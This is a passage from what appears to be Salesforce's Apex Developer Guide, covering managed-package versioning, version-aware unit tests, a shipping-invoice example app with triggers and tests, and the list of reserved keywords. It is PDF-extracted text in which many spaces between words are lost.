o.addError('Alldealsover50% requirea description');
}
}
// Validationappliesto all versionsof the managedpackage.
if (o.IsWon== true&& o.LeadSource== null) {
o.addError('A leadsourcemustbe providedfor all ClosedWon deals');
}
}
}
For a full list of methods that work with package versions, see Version Class and the System.requestVersion method in System
Class.
The request context is persisted if a class in the installed package invokes a method in another class in the package. For example, a
subscriber has installed a GeoReports package that contains CountryUtil and ContinentUtil Apex classes. The subscriber creates a new
GeoReportsEx class and uses the version settings to bind it to version 2.3 of the GeoReports package. If GeoReportsEx invokes a method
in ContinentUtil that internally invokes a method in CountryUtil, the request context is propagated from ContinentUtil to CountryUtil
and the System.requestVersion method in CountryUtil returns version 2.3 of the GeoReports package.
Apex Code Items that Are Not Versioned
You can change the behavior of some Apex items across package versions. For example, you can deprecate a method so that new
subscribers can no longer reference the package in a subsequent version.
However, the following list of modifiers, keywords, and annotations cannot be versioned. If a package developer makes changes to one
of the following modifiers, keywords, or annotations, the changes are reflected across all package versions.
There are limitations on the changes that you can make to some of these items when they are used in Apex code in managed packages.
Package developers can add or remove the following items:
•
@future
•
@isTest
•
withsharing
•
withoutsharing
•
transient
Package developers can make limited changes to the following items:
•
private—can be changed to global
•
public—can be changed to global
•
protected—can be changed to global
•
abstract—can be changed to virtual but cannot be removed
755
Distributing Apex Using Managed PackagesApex Developer Guide

•
final—can be removed but cannot be added
Package developers cannot remove or change the following items:
•
global
•
virtual
Package developers can add the webservice keyword, but once it has been added, it cannot be removed.
Note:  You cannot deprecate webservice methods or variables in managed package code.
If a package upgrade includes an explicit global constructor for an already released global class (that previously only had an implicit
constructor) the new, explicit constructor will be called from the subscriber. Additionally, you cannot reduce the access modifier on the
default constructor on a released global class in a package.
Testing Behavior in Package Versions
When you change the behavior in an Apex class or trigger for different package versions, it is important to test that your code runs as
expected in the different package versions. You can write test methods that change the package version context to a different package
version by using the system method runAs. You can only use runAs in a test method.
The following sample shows a trigger with different behavior for different package versions.
triggeroppValidationon Opportunity(beforeinsert, beforeupdate) {
for (Opportunityo : Trigger.new){
// Add a new validationto the package
// Appliesto versionsof the managedpackagegreaterthan1.0
if (System.requestVersion().compareTo(new Version(1,0))> 0) {
if (o.Probability>= 50 && o.Description== null) {
o.addError('Alldealsover50% requirea description');
}
}
// Validationappliesto all versionsof the managedpackage.
if (o.IsWon== true&& o.LeadSource== null) {
o.addError('A leadsourcemustbe providedfor all ClosedWon deals');
}
}
}
The following test class uses the runAs method to verify the trigger's behavior with and without a specific version:
@isTest
privateclassOppTriggerTests{
statictestMethodvoidtestOppValidation(){
// Set up 50% opportunitywithno description
Opportunityo = new Opportunity();
o.Name= 'TestJob';
o.Probability= 50;
o.StageName= 'Prospect';
o.CloseDate= System.today();
756
Distributing Apex Using Managed PackagesApex Developer Guide

// Testrunningas latestpackageversion
try{
inserto;
}
catch(System.DMLExceptione){
System.assert(
e.getMessage().contains(
'Alldealsover50% requirea description'),
e.getMessage());
}
// Run testas managedpackageversion1.0
System.runAs(new Version(1,0)){
try{
inserto;
}
catch(System.DMLExceptione){
System.assert(false, e.getMessage());
}
}
// Set up a closedwon opportunitywithno leadsource
o = new Opportunity();
o.Name= 'TestJob';
o.Probability= 50;
o.StageName= 'Prospect';
o.CloseDate= System.today();
o.StageName= 'ClosedWon';
// Testrunningas latestpackageversion
try{
inserto;
}
catch(System.DMLExceptione){
System.assert(
e.getMessage().contains(
'A leadsourcemustbe providedfor all ClosedWon deals'),
e.getMessage());
}
// Run testas managedpackageversion1.0
System.runAs(new Version(1,0)){
try{
inserto;
}
catch(System.DMLExceptione){
System.assert(
e.getMessage().contains(
'A leadsourcemustbe providedfor all ClosedWon deals'),
e.getMessage());
}
}
}
}
757
Distributing Apex Using Managed PackagesApex Developer Guide

Apex Reference
In Summer ’21 and later versions, Apex reference content is moved to a separate guide called the Apex Reference Guide.
For reference information on Apex classes, interfaces, exceptions and so on, see Apex Reference Guide.
Appendices
Shipping Invoice Example
Reserved Keywords
These words can be used only as keywords.
Documentation Typographical Conventions
Apex and Visualforce documentation uses these typographical conventions.
Shipping Invoice Example
This appendix provides an example of an Apex application. This is a more complex example than the Hello World example.
•
Shipping Invoice Walk-Through
•
Shipping Invoice Example Code
1.Shipping Invoice Example Walk-Through
2.Shipping Invoice Example Code
Shipping Invoice Example Walk-Through
The sample application in this section includes traditional Salesforce functionality blended with Apex. Many of the syntactic and semantic
features of Apex, along with common idioms, are illustrated in this application.
Note:  The Shipping Invoice sample requires custom objects. You can either create these on your own, or download the objects
and Apex code as an unmanaged package from the Salesforce AppExchange. To obtain the sample assets in your org, install the
Apex Tutorials Package. This package also contains sample code and objects for the Apex Quick Start.
Scenario
In this sample application, the user creates a new shipping invoice, or order, and then adds items to the invoice. The total amount for
the order, including shipping cost, is automatically calculated and updated based on the items added or deleted from the invoice.
Data and Code Models
This sample application uses two new objects: Item and Shipping_invoice.
The following assumptions are made:
•
Item A cannot be in both orders shipping_invoice1 and shipping_invoice2. Two customers cannot obtain the same (physical)
product.
•
The tax rate is 9.25%.
758
Apex ReferenceApex Developer Guide

•
The shipping rate is 75 cents per pound.
•
Once an order is over $100, the shipping discount is applied (shipping becomes free).
The fields in the Item custom object include:
DescriptionTypeName
The name of the itemStringName
The price of the itemCurrencyPrice
The number of items in the orderNumberQuantity
The weight of the item, used to calculate shipping costsNumberWeight
The order this item is associated withMaster-Detail (shipping_invoice)Shipping_invoice
The fields in the Shipping_invoice custom object include:
DescriptionTypeName
The name of the shipping invoice/orderStringName
The subtotalCurrencySubtotal
The total amount, including tax and shippingCurrencyGrandTotal
The amount charged for shipping (assumes $0.75 per pound)CurrencyShipping
Only applied once when subtotal amount reaches $100CurrencyShippingDiscount
The amount of tax (assumes 9.25%)CurrencyTax
The total weight of all itemsNumberTotalWeight
All of the Apex for this application is contained in triggers. This application has the following triggers:
DescriptionWhen RunsTrigger NameObject
Updates the shipping invoice, calculates the totals and
shipping
after insert, after update, after deleteCalculateItem
Updates the shipping invoice, calculating if there is a
shipping discount
after updateShippingDiscountShipping_invoice
The following is the general flow of user actions and when triggers run:
759
Shipping Invoice ExampleApex Developer Guide

Flow of user action and triggers for the shopping cart application
1.User clicks Orders > New, names the shipping invoice and clicks Save.
2.User clicks New Item, fills out information, and clicks Save.
3.Calculate trigger runs. Part of the Calculate trigger updates the shipping invoice.
4.ShippingDiscount trigger runs.
5.User can then add, delete or change items in the invoice.
In Shipping Invoice Example Code both of the triggers and the test class are listed. The comments in the code explain the functionality.
Testing the Shipping Invoice Application
Before an application can be included as part of a package, 75% of the code must be covered by unit tests. Therefore, one piece of the
shipping invoice application is a class used for testing the triggers.
The test class verifies the following actions are completed successfully:
•
Inserting items
•
Updating items
•
Deleting items
•
Applying shipping discount
•
Negative test for bad input
Shipping Invoice Example Code
The following triggers and test class make up the shipping invoice example application:
760
Shipping Invoice ExampleApex Developer Guide

•
Calculate trigger
•
ShippingDiscount trigger
•
Test class
Calculate Trigger
triggercalculateon Item__c(afterinsert, afterupdate, afterdelete) {
// Use a map becauseit doesn'tallowduplicatevalues
Map<ID, Shipping_Invoice__C>updateMap= new Map<ID, Shipping_Invoice__C>();
// Set thisintegerto -1 if we are deleting
Integersubtract;
// Populatethe listof itemsbasedon triggertype
List<Item__c>itemList;
if(trigger.isInsert|| trigger.isUpdate){
itemList= Trigger.new;
subtract= 1;
}
elseif(trigger.isDelete)
{
// Note-- thereis no trigger.newin delete
itemList= trigger.old;
subtract= -1;
}
// Accessall the informationwe needin a singlequery
// ratherthanqueryingwhenwe needit.
// Thisis a bestpracticefor bulkifyingrequests
set<Id>AllItems= new set<id>();
for(item__ci :itemList){
// Assertnumbersare not negative.
// Noneof the fieldswouldmakesensewitha negativevalue
System.assert(i.quantity__c> 0, 'Quantitymustbe positive');
System.assert(i.weight__c>= 0, 'Weightmustbe non-negative');
System.assert(i.price__c>= 0, 'Pricemustbe non-negative');
// If thereis a duplicateId, it won'tget addedto a set
AllItems.add(i.Shipping_Invoice__C);
}
// Accessingall shippinginvoicesassociatedwiththe itemsin the trigger
List<Shipping_Invoice__C>AllShippingInvoices= [SELECTId, ShippingDiscount__c,
SubTotal__c,TotalWeight__c,Tax__c,GrandTotal__c
FROMShipping_Invoice__CWHEREId IN :AllItems];
// Takethe listwe justpopulatedand put it intoa Map.
// Thiswillmakeit easierto lookup a shippinginvoice
761
Shipping Invoice ExampleApex Developer Guide

// becauseyou mustiteratea list,but you can use lookupfor a map,
Map<ID, Shipping_Invoice__C>SIMap= new Map<ID, Shipping_Invoice__C>();
for(Shipping_Invoice__Csc : AllShippingInvoices)
{
SIMap.put(sc.id,sc);
}
// Processthe listof items
if(Trigger.isUpdate)
{
// Treatupdateslikea removalof the old itemand additionof the
// reviseditemratherthanfiguringout the differencesof eachfield
// and actingaccordingly.
// Noteupdateshavebothtrigger.newand trigger.old
for(Integerx = 0; x < Trigger.old.size();x++)
{
Shipping_Invoice__CmyOrder;
myOrder= SIMap.get(trigger.old[x].Shipping_Invoice__C);
// Decrementthe previousvaluefromthe subtotaland weight.
myOrder.SubTotal__c-= (trigger.old[x].price__c*
trigger.old[x].quantity__c);
myOrder.TotalWeight__c-= (trigger.old[x].weight__c*
trigger.old[x].quantity__c);
// Incrementthe new subtotaland weight.
myOrder.SubTotal__c+= (trigger.new[x].price__c*
trigger.new[x].quantity__c);
myOrder.TotalWeight__c+= (trigger.new[x].weight__c*
trigger.new[x].quantity__c);
}
for(Shipping_Invoice__CmyOrder: AllShippingInvoices)
{
// Set tax rateto 9.25%Pleasenote,thisis a simpleexample.
// Generally,you wouldneverhardcodevalues.
// LeveragingCustomSettingsfor tax ratesis a bestpractice.
// See CustomSettingsin the ApexDeveloperGuide
// for moreinformation.
myOrder.Tax__c= myOrder.Subtotal__c* .0925;
// Resetthe shippingdiscount
myOrder.ShippingDiscount__c= 0;
// Set shippingrateto 75 centsper pound.
// Generally,you wouldneverhardcodevalues.
// LeveragingCustomSettingsfor the shippingrateis a bestpractice.
// See CustomSettingsin the ApexDeveloperGuide
// for moreinformation.
myOrder.Shipping__c= (myOrder.totalWeight__c* .75);
myOrder.GrandTotal__c= myOrder.SubTotal__c+ myOrder.tax__c+
myOrder.Shipping__c;
762
Shipping Invoice ExampleApex Developer Guide

updateMap.put(myOrder.id,myOrder);
}
}
else
{
for(Item__citemToProcess: itemList)
{
Shipping_Invoice__CmyOrder;
// Lookup the correctshippinginvoicefromthe oneswe got earlier
myOrder= SIMap.get(itemToProcess.Shipping_Invoice__C);
myOrder.SubTotal__c+= (itemToProcess.price__c*
itemToProcess.quantity__c* subtract);
myOrder.TotalWeight__c+= (itemToProcess.weight__c*
itemToProcess.quantity__c* subtract);
}
for(Shipping_Invoice__CmyOrder: AllShippingInvoices)
{
// Set tax rateto 9.25%Pleasenote,thisis a simpleexample.
// Generally,you wouldneverhardcodevalues.
// LeveragingCustomSettingsfor tax ratesis a bestpractice.
// See CustomSettingsin the ApexDeveloperGuide
// for moreinformation.
myOrder.Tax__c= myOrder.Subtotal__c* .0925;
// Resetshippingdiscount
myOrder.ShippingDiscount__c= 0;
// Set shippingrateto 75 centsper pound.
// Generally,you wouldneverhardcodevalues.
// LeveragingCustomSettingsfor the shippingrateis a bestpractice.
// See CustomSettingsin the ApexDeveloperGuide
// for moreinformation.
myOrder.Shipping__c= (myOrder.totalWeight__c* .75);
myOrder.GrandTotal__c= myOrder.SubTotal__c+ myOrder.tax__c+
myOrder.Shipping__c;
updateMap.put(myOrder.id,myOrder);
}
}
// Onlyuse one DML updateat the end.
// Thisminimizesthe numberof DML requestsgeneratedfromthistrigger.
updateupdateMap.values();
}
ShippingDiscount Trigger
triggerShippingDiscounton Shipping_Invoice__C(beforeupdate) {
// Freeshippingon all ordersgreaterthan$100
763
Shipping Invoice ExampleApex Developer Guide

for(Shipping_Invoice__CmyShippingInvoice: Trigger.new)
{
if((myShippingInvoice.subtotal__c>= 100.00)&&
(myShippingInvoice.ShippingDiscount__c== 0))
{
myShippingInvoice.ShippingDiscount__c=
myShippingInvoice.Shipping__c* -1;
myShippingInvoice.GrandTotal__c+= myShippingInvoice.ShippingDiscount__c;
}
}
}
Shipping Invoice Test
@IsTest
privateclassTestShippingInvoice{
// Testfor insertingthreeitemsat once
publicstatictestmethodvoidtestBulkItemInsert(){
// Createthe shippinginvoice.It'sa bestpracticeto eitheruse defaults
// or to explicitlyset all valuesto zeroso as to avoidhaving
// extraneousdatain yourtest.
Shipping_Invoice__Corder1= new Shipping_Invoice__C(subtotal__c= 0,
totalweight__c= 0, grandtotal__c= 0,
ShippingDiscount__c= 0, Shipping__c= 0, tax__c= 0);
// Insertthe orderand populatewithitems
insertOrder1;
List<Item__c>list1= new List<Item__c>();
Item__citem1= new Item__C(Price__c= 10, weight__c= 1, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citem2= new Item__C(Price__c= 25, weight__c= 2, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citem3= new Item__C(Price__c= 40, weight__c= 3, quantity__c= 1,
Shipping_Invoice__C= order1.id);
list1.add(item1);
list1.add(item2);
list1.add(item3);
insertlist1;
// Retrievethe order,thendo assertions
order1= [SELECTid, subtotal__c,tax__c,shipping__c,totalweight__c,
grandtotal__c,shippingdiscount__c
FROMShipping_Invoice__C
WHEREid = :order1.id];
System.assert(order1.subtotal__c== 75,
'Ordersubtotalwas not $75,but was '+ order1.subtotal__c);
System.assert(order1.tax__c== 6.9375,
'Ordertax was not $6.9375,but was ' + order1.tax__c);
System.assert(order1.shipping__c== 4.50,
'Ordershippingwas not $4.50,but was ' + order1.shipping__c);
764
Shipping Invoice ExampleApex Developer Guide

System.assert(order1.totalweight__c== 6.00,
'Orderweightwas not 6 but was ' + order1.totalweight__c);
System.assert(order1.grandtotal__c== 86.4375,
'Ordergrandtotalwas not $86.4375but was '
+ order1.grandtotal__c);
System.assert(order1.shippingdiscount__c== 0,
'Ordershippingdiscountwas not $0 but was '
+ order1.shippingdiscount__c);
}
// Testfor updatingthreeitemsat once
publicstatictestmethodvoidtestBulkItemUpdate(){
// Createthe shippinginvoice.It'sa bestpracticeto eitheruse defaults
// or to explicitlyset all valuesto zeroso as to avoidhaving
// extraneousdatain yourtest.
Shipping_Invoice__Corder1= new Shipping_Invoice__C(subtotal__c= 0,
totalweight__c= 0, grandtotal__c= 0,
ShippingDiscount__c= 0, Shipping__c= 0, tax__c= 0);
// Insertthe orderand populatewithitems.
insertOrder1;
List<Item__c>list1= new List<Item__c>();
Item__citem1= new Item__C(Price__c= 1, weight__c= 1, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citem2= new Item__C(Price__c= 2, weight__c= 2, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citem3= new Item__C(Price__c= 4, weight__c= 3, quantity__c= 1,
Shipping_Invoice__C= order1.id);
list1.add(item1);
list1.add(item2);
list1.add(item3);
insertlist1;
// Updatethe priceson the 3 items
list1[0].price__c= 10;
list1[1].price__c= 25;
list1[2].price__c= 40;
updatelist1;
// Accessthe orderand assertitemsupdated
order1= [SELECTid, subtotal__c,tax__c,shipping__c,totalweight__c,
grandtotal__c,shippingdiscount__c
FROMShipping_Invoice__C
WHEREId = :order1.Id];
System.assert(order1.subtotal__c== 75,
'Ordersubtotalwas not $75,but was '+ order1.subtotal__c);
System.assert(order1.tax__c== 6.9375,
'Ordertax was not $6.9375,but was ' + order1.tax__c);
System.assert(order1.shipping__c== 4.50,
'Ordershippingwas not $4.50,but was '
+ order1.shipping__c);
System.assert(order1.totalweight__c== 6.00,
765
Shipping Invoice ExampleApex Developer Guide

'Orderweightwas not 6 but was ' + order1.totalweight__c);
System.assert(order1.grandtotal__c== 86.4375,
'Ordergrandtotalwas not $86.4375but was '
+ order1.grandtotal__c);
System.assert(order1.shippingdiscount__c== 0,
'Ordershippingdiscountwas not $0 but was '
+ order1.shippingdiscount__c);
}
// Testfor deletingitems
publicstatictestmethodvoidtestBulkItemDelete(){
// Createthe shippinginvoice.It'sa bestpracticeto eitheruse defaults
// or to explicitlyset all valuesto zeroso as to avoidhaving
// extraneousdatain yourtest.
Shipping_Invoice__Corder1= new Shipping_Invoice__C(subtotal__c= 0,
totalweight__c= 0, grandtotal__c= 0,
ShippingDiscount__c= 0, Shipping__c= 0, tax__c= 0);
// Insertthe orderand populatewithitems
insertOrder1;
List<Item__c>list1= new List<Item__c>();
Item__citem1= new Item__C(Price__c= 10, weight__c= 1, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citem2= new Item__C(Price__c= 25, weight__c= 2, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citem3= new Item__C(Price__c= 40, weight__c= 3, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citemA= new Item__C(Price__c= 1, weight__c= 3, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citemB= new Item__C(Price__c= 1, weight__c= 3, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citemC= new Item__C(Price__c= 1, weight__c= 3, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citemD= new Item__C(Price__c= 1, weight__c= 3, quantity__c= 1,
Shipping_Invoice__C= order1.id);
list1.add(item1);
list1.add(item2);
list1.add(item3);
list1.add(itemA);
list1.add(itemB);
list1.add(itemC);
list1.add(itemD);
insertlist1;
// Sevenitemsare now in the shippinginvoice.
// The followingdeletesfourof them.
List<Item__c>list2= new List<Item__c>();
list2.add(itemA);
list2.add(itemB);
list2.add(itemC);
list2.add(itemD);
deletelist2;
766
Shipping Invoice ExampleApex Developer Guide

// Retrievethe orderand verifythe deletion
order1= [SELECTid, subtotal__c,tax__c,shipping__c,totalweight__c,
grandtotal__c,shippingdiscount__c
FROMShipping_Invoice__C
WHEREId = :order1.Id];
System.assert(order1.subtotal__c== 75,
'Ordersubtotalwas not $75,but was '+ order1.subtotal__c);
System.assert(order1.tax__c== 6.9375,
'Ordertax was not $6.9375,but was ' + order1.tax__c);
System.assert(order1.shipping__c== 4.50,
'Ordershippingwas not $4.50,but was ' + order1.shipping__c);
System.assert(order1.totalweight__c== 6.00,
'Orderweightwas not 6 but was ' + order1.totalweight__c);
System.assert(order1.grandtotal__c== 86.4375,
'Ordergrandtotalwas not $86.4375but was '
+ order1.grandtotal__c);
System.assert(order1.shippingdiscount__c== 0,
'Ordershippingdiscountwas not $0 but was '
+ order1.shippingdiscount__c);
}
// Testingfreeshipping
publicstatictestmethodvoidtestFreeShipping(){
// Createthe shippinginvoice.It'sa bestpracticeto eitheruse defaults
// or to explicitlyset all valuesto zeroso as to avoidhaving
// extraneousdatain yourtest.
Shipping_Invoice__Corder1= new Shipping_Invoice__C(subtotal__c= 0,
totalweight__c= 0, grandtotal__c= 0,
ShippingDiscount__c= 0, Shipping__c= 0, tax__c= 0);
// Insertthe orderand populatewithitems.
insertOrder1;
List<Item__c>list1= new List<Item__c>();
Item__citem1= new Item__C(Price__c= 10, weight__c= 1,
quantity__c= 1, Shipping_Invoice__C= order1.id);
Item__citem2= new Item__C(Price__c= 25, weight__c= 2,
quantity__c= 1, Shipping_Invoice__C= order1.id);
Item__citem3= new Item__C(Price__c= 40, weight__c= 3,
quantity__c= 1, Shipping_Invoice__C= order1.id);
list1.add(item1);
list1.add(item2);
list1.add(item3);
insertlist1;
// Retrievethe orderand verifyfreeshippingnot applicable
order1= [SELECTid, subtotal__c,tax__c,shipping__c,totalweight__c,
grandtotal__c,shippingdiscount__c
FROMShipping_Invoice__C
WHEREId = :order1.Id];
// Freeshippingnot availableon $75 orders
System.assert(order1.subtotal__c== 75,
767
Shipping Invoice ExampleApex Developer Guide

'Ordersubtotalwas not $75,but was '+ order1.subtotal__c);
System.assert(order1.tax__c== 6.9375,
'Ordertax was not $6.9375,but was ' + order1.tax__c);
System.assert(order1.shipping__c== 4.50,
'Ordershippingwas not $4.50,but was ' + order1.shipping__c);
System.assert(order1.totalweight__c== 6.00,
'Orderweightwas not 6 but was ' + order1.totalweight__c);
System.assert(order1.grandtotal__c== 86.4375,
'Ordergrandtotalwas not $86.4375but was '
+ order1.grandtotal__c);
System.assert(order1.shippingdiscount__c== 0,
'Ordershippingdiscountwas not $0 but was '
+ order1.shippingdiscount__c);
// Add itemsto increasesubtotal
item1= new Item__C(Price__c= 25, weight__c= 20, quantity__c= 1,
Shipping_Invoice__C= order1.id);
insertitem1;
// Retrievethe orderand verifyfreeshippingis applicable
order1= [SELECTid, subtotal__c,tax__c,shipping__c,totalweight__c,
grandtotal__c,shippingdiscount__c
FROMShipping_Invoice__C
WHEREId = :order1.Id];
// Ordertotalis now at $100,so freeshippingshouldbe enabled
System.assert(order1.subtotal__c== 100,
'Ordersubtotalwas not $100,but was '+ order1.subtotal__c);
System.assert(order1.tax__c== 9.25,
'Ordertax was not $9.25,but was ' + order1.tax__c);
System.assert(order1.shipping__c== 19.50,
'Ordershippingwas not $19.50,but was '
+ order1.shipping__c);
System.assert(order1.totalweight__c== 26.00,
'Orderweightwas not 26 but was ' + order1.totalweight__c);
System.assert(order1.grandtotal__c== 109.25,
'Ordergrandtotalwas not $86.4375but was '
+ order1.grandtotal__c);
System.assert(order1.shippingdiscount__c== -19.50,
'Ordershippingdiscountwas not -$19.50but was '
+ order1.shippingdiscount__c);
}
// Negativetestingfor insertingbad input
publicstatictestmethodvoidtestNegativeTests(){
// Createthe shippinginvoice.It'sa bestpracticeto eitheruse defaults
// or to explicitlyset all valuesto zeroso as to avoidhaving
// extraneousdatain yourtest.
Shipping_Invoice__Corder1= new Shipping_Invoice__C(subtotal__c= 0,
totalweight__c= 0, grandtotal__c= 0,
ShippingDiscount__c= 0, Shipping__c= 0, tax__c= 0);
// Insertthe orderand populatewithitems.
768
Shipping Invoice ExampleApex Developer Guide

insertOrder1;
Item__citem1= new Item__C(Price__c= -10,weight__c= 1, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citem2= new Item__C(Price__c= 25, weight__c= -2, quantity__c= 1,
Shipping_Invoice__C= order1.id);
Item__citem3= new Item__C(Price__c= 40, weight__c= 3, quantity__c= -1,
Shipping_Invoice__C= order1.id);
Item__citem4= new Item__C(Price__c= 40, weight__c= 3, quantity__c= 0,
Shipping_Invoice__C= order1.id);
try{
insertitem1;
}
catch(Exceptione)
{
system.assert(e.getMessage().contains('Pricemustbe non-negative'),
'Pricewas negativebut was not caught');
}
try{
insertitem2;
}
catch(Exceptione)
{
system.assert(e.getMessage().contains('Weightmustbe non-negative'),
'Weightwas negativebut was not caught');
}
try{
insertitem3;
}
catch(Exceptione)
{
system.assert(e.getMessage().contains('Quantitymustbe positive'),
'Quantitywas negativebut was not caught');
}
try{
insertitem4;
}
catch(Exceptione)
{
system.assert(e.getMessage().contains('Quantitymustbe positive'),
'Quantitywas zerobut was not caught');
}
}
}
Reserved Keywords
These words can be used only as keywords.
769
Reserved KeywordsApex Developer Guide

Table 11: Reserved Keywords
packagefalseabstract
parallelfinalactivate
pragmafinallyand
privatefloatany
protectedforarray
publicfromas
retrieveglobalasc
returngotoautonomous
rollbackgroupbegin
selecthavingbigdecimal
sethintblob
shortifboolean
sObjectimplementsbreak
sortimportbulk
staticinby
stringinnerbyte
superinsertcase
switchinstanceofcast
synchronizedintcatch
systemintegerchar
testmethodinterfaceclass
thenintocollect
thisjoincommit
throwlikeconst
timelimitcontinue
transactionlistcurrency
triggerlongdate
trueloopdatetime
trymapdecimal
undeletemergedefault
updatenewdelete
upsertnotdesc
usingnulldo
virtualnullsdouble
voidnumberelse
770
Reserved KeywordsApex Developer Guide

webserviceobjectend
whenofenum
whereonexception
orexitwhile
outerexport
overrideextends
These words are special types of keywords that aren't reserved words and can be used as identifiers.
•
after
•
before
•
count
•
excludes
•
first
•
includes
•
last
•
order
•
sharing
•
with
Documentation Typographical Conventions
Apex and Visualforce documentation uses these typographical conventions.
DescriptionConvention
In descriptions of syntax, a monospace font indicates items that you should type as shown,
except for brackets. For example:
PublicclassHelloWorld
Courierfont
In descriptions of syntax, italics represent variables. You supply the actual value. In the following
example, three values must be supplied: datatypevariable_name [ = value];
If the syntax is bold and italic, the text represents a code element that needs a value supplied
by you, such as a class name or variable value:
publicstaticclassYourClassHere{ ... }
Italics
In code samples and syntax descriptions, a bold courier font emphasizes a portion of the code
or syntax.
BoldCourierfont
In descriptions of syntax, less-than and greater-than symbols (< >) are typed exactly as shown.
<apex:pageBlockTablevalue="{!account.Contacts}"var="contact">
< >
771
Documentation Typographical ConventionsApex Developer Guide

DescriptionConvention
<apex:columnvalue="{!contact.Name}"/>
<apex:columnvalue="{!contact.MailingCity}"/>
<apex:columnvalue="{!contact.Phone}"/>
</apex:pageBlockTable>
In descriptions of syntax, braces ({ }) are typed exactly as shown.
<apex:page>
Hello{!$User.FirstName}!
</apex:page>
{ }
In descriptions of syntax, anything included in brackets is optional. In the following example,
specifying value is optional:
data_typevariable_name[ =value];
[ ]
In descriptions of syntax, the pipe sign means “or”. You can do one of the following (not all).
In the following example, you can create a new unpopulated set in one of two ways, or you
can populate the set:
Set<data_type>set_name
[= new Set<data_type>();]|
|
[= new Set<data_type{value[,value2. . .] };] |
;
772
Documentation Typographical ConventionsApex Developer Guide
